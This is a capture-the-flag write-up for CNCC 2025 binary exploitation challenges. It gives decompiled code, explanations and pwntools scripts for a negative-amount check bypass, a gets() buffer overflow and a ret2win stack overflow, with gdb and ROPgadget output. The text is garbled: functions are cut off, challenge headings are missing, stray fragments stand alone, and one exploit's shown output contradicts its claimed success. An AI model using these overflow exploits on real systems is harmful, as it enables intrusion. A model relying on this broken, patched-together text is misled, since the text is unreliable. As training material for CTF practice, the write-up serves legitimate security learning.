## CNCC 2025 (First Round)
### Binary Exploitation (pwn)
#### Challenge 1
- You can download the binary [here](/assets/challenges/CNCC_1st/pwn1).

##### Decompiled Code (Ghidra)
###### `main` Function
```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  int amount_to_withdraw;
  uint current_balance;

    show_flag();
  }

```
###### `show_flag` Function
```c
void show_flag(void)

{
  char *pcVar1;
  char local_118 [264];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Could not open flag.txt");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    pcVar1 = fgets(local_118,0x100,local_10);
    if (pcVar1 == (char *)0x0) break;
    printf("%s",local_118);
  }
  fclose(local_10);
  return;
}
```
##### Vulnerability Analysis
In order to trigger the `show_flag` function, we must pass the check `current_balance == 1000000`. `current_balance` set to 100 before the check. The key vulnerability is that our `amount_to_withdraw` is only checked if we input 0, it did not check if our input is negative, which means we can input negative value to make our `current_balance == 1000000`. `100 - 1000000 = -999900`, so the solution is `-999900`.

```shell
Enter amount to withdraw: -999900

CNCC{fake_flag}
```

```c
{
```

###### `vuln` Function
```c

void vuln(void)

{
  undefined1 buffer [76];
  uint target;
  
  target = 0;
  printf("Enter your input:\n> ");
  gets(buffer);
  if (target == 0x1337) {
    win();
  }
  else {
    printf("[-] magic = %d (0x%x). Try again!\n",(ulong)target,(ulong)target);
  }
  return;
}
```
###### `win` Function
```c
void win(void)

{
  puts("[+] Success! You set magic to 0x1337!");
  system("cat flag.txt");
  return;
}
```
##### Vulnerability Analysis
There is a buffer overflow vulnerability in `vuln` function due to the use of `gets` function and has no canary, which reads into buffer without checking the buffer size. In order to trigger the `win` function, we need to read in our input past the buffer to overwrite `target` and set it to 0x1337, which sits next to the buffer. So, we need to input 76 bytes to fill the buffer and input 0x1337 after that.
##### Exploitation
```python
from pwn import *

p = process('./pwn2')
# p = remote('3.1.32.51', 8010)

payload = b'A'*76
payload += p64(0x1337)

p.sendline(payload)
p.interactive()
```

```shell
[*] Switching to interactive mode
Enter your input:

[*] Got EOF while reading in interactive
$
```

```c
void get_flag(void)
```

##### Vulnerability Analysis
There is a buffer overflow vulnerability in `greet_user` function and has no canary protection, which means we can overwrite `RIP` of the `greet_user` function to call other functions that `main` and `greet_user` did not call, in this case we want to call `get_flag` function in order to get flag. This technique is call `ret2win`. Next, let's find the correct offset of how many bytes should we input in order to reach `RIP`. There are multiple ways to do this but i recommend using `gdb`, which is a tool uses for binary debugging.
When we are in gdb, add a breakpoint after the `fgets` function is called, which is the address of `0x401215` and then run the binary with `87654321` input.

After that we search for our `87654321` input to find out what address that contain it.
```shell
pwndbg> search 87654321
Searching for byte: b'87654321'
[stack]         0x7fffffffdb80 '87654321\n'
```
`87654321` is at 0x7fffffffdb80. Now let's find the address of `RIP` by using `info frame` command.
```shell
pwndbg> info frame
Stack level 0, frame at 0x7fffffffdbc0:
 rip = 0x401215 in greet_user; saved rip = 0x40127e
 called by frame at 0x7fffffffdbd0
 Arglist at 0x7fffffffdbb0, args:
 Locals at 0x7fffffffdbb0, Previous frame's sp is 0x7fffffffdbc0
 Saved registers:
  rbp at 0x7fffffffdbb0, rip at 0x7fffffffdbb8
```
We can see that `RIP` is at 0x7fffffffdbb8. Now let's calculate the correct offset from our input to `RIP` using basic math by taking address of `RIP` - address of `our input`.
```shell
pwndbg> x 0x7fffffffdbb8-0x7fffffffdb80
0x38:   Cannot access memory at address 0x38
```
So, the correct offset to reach `RIP` is 0x38 bytes. Last step is to find the address of `get_flag` function.
```shell
pwndbg> p get_flag
$1 = {<text variable, no debug info>} 0x4011b6 <get_flag>
```
Now that we have all we need for `ret2win`, let's write our exploit script.
##### Exploitation
```python
from pwn import *

p = process('./pwn3')
# p= remote('3.1.32.51', 8001)

payload = b'A'*0x38
payload += p64(0x4011b6) # get_flag

p.sendline(payload)

p.interactive()
```
Run it
```shell
$ python3 pwn3.py
[+] Starting local process './pwn3': pid 4437
[*] Switching to interactive mode
Hello, SALA venturer.
Enter your name to continue:
Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb6\x11@Nice job! Here’s your prize:
[*] Got EOF while reading in interactive
$
```
oops, why is it not working? This is because in 64 bits arch, the stack is very easily miss aligned, so to make the stack align, we should call instruction `ret` before calling `get_flag` function. Let's find the address of `ret` gadget.
```shell
$ ROPgadget --binary ./pwn3 | grep "ret"
0x000000000040101a : ret
```
Now let's rewrite our exploit
```python
from pwn import *

p = process('./pwn3')
# p= remote('3.1.32.51', 8001)

payload = b'A'*0x38
payload += p64(0x40101a) # ret_gadget
payload += p64(0x4011b6) # get_flag

p.sendline(payload)

p.interactive()
```
Run it
```python
$ python3 pwn3.py
[+] Starting local process './pwn3': pid 4565
[*] Switching to interactive mode
Hello, SALA venturer.
Enter your name to continue:
Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10@Nice job! Here’s your prize:
CNCC{fake_flag}
[*] Got EOF while reading in interactive
$
```
And we solved it.
